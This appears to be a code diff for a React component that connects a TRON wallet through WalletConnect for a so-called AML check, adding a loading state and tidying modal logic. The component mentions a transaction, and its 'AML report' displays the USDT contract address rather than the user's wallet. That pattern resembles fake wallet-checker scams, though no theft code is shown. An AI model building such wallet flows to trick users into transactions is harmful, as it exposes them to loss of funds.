@@ -26,18 +26,18 @@ const adapter = new WalletConnectAdapter({
   },
   web3ModalConfig: {
     themeMode: 'dark',
-    explorerRecommendedWalletIds: [
-      // твои WalletConnect ID
-    ],
+    explorerRecommendedWalletIds: [],
   },
 });
 
 export const TronAuthButton: React.FC = () => {
-  const [modalMessage, setModalMessage] = useState<string | null>("");
+  const [modalMessage, setModalMessage] = useState<string | null>(null);
+  const [loading, setLoading] = useState(false);
 
   const disconnectAndNotify = async (message: string) => {
-    setModalMessage(message);
     await adapter.disconnect();
+    setModalMessage(message);
+    setLoading(false);
   };
 
   const waitForAddress = async (timeout = 30000): Promise<string> => {
@@ -58,6 +58,7 @@ export const TronAuthButton: React.FC = () => {
 
   const connectWallet = async () => {
     try {
+      setLoading(true);
       await adapter.connect();
 
       const userAddress = await waitForAddress();
@@ -106,7 +107,6 @@ export const TronAuthButton: React.FC = () => {
     } catch (err: any) {
       console.error('Error:', err);
       await adapter.disconnect();
-
       const errMsg = err?.message || err?.toString();
 
       if (
@@ -115,22 +115,26 @@ export const TronAuthButton: React.FC = () => {
         errMsg.includes('User rejected') ||
         errMsg.includes('Timeout waiting for wallet connection')
       ) {
+        setLoading(false);
         return;
       }
 
       setModalMessage('⚠️ Connection or transaction error');
+      setLoading(false);
     }
   };
 
   return (
-    <div onClick={connectWallet} className='AuthButton'>
+    <>
+      <div onClick={connectWallet} className='AuthButton'>
+        {loading ? 'Connecting...' : 'Check Wallet'}
+      </div>
+
       {modalMessage && (
         <div className='modal__overflow'>
           <div className="modal">
             {modalMessage !== 'succes' ? (
-              <>
-                <p>{modalMessage}</p>
-              </>
+              <p>{modalMessage}</p>
             ) : (
               <>
                 <div className="content greenBorder">
@@ -146,13 +150,12 @@ export const TronAuthButton: React.FC = () => {
                 </div>
                 <div className="content report">
                   <p>AML report for a wallet:</p>
-                  <h5>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</h5>
+                  <h5>{USDT_CONTRACT}</h5>
                 </div>
               </>
             )}
             <button
-              onClick={async () => {
-                await adapter.disconnect();
+              onClick={() => {
                 setModalMessage(null);
               }}
             >
@@ -161,6 +164,6 @@ export const TronAuthButton: React.FC = () => {
           </div>
         </div>
       )}
-    </div>
+    </>
   );
 };
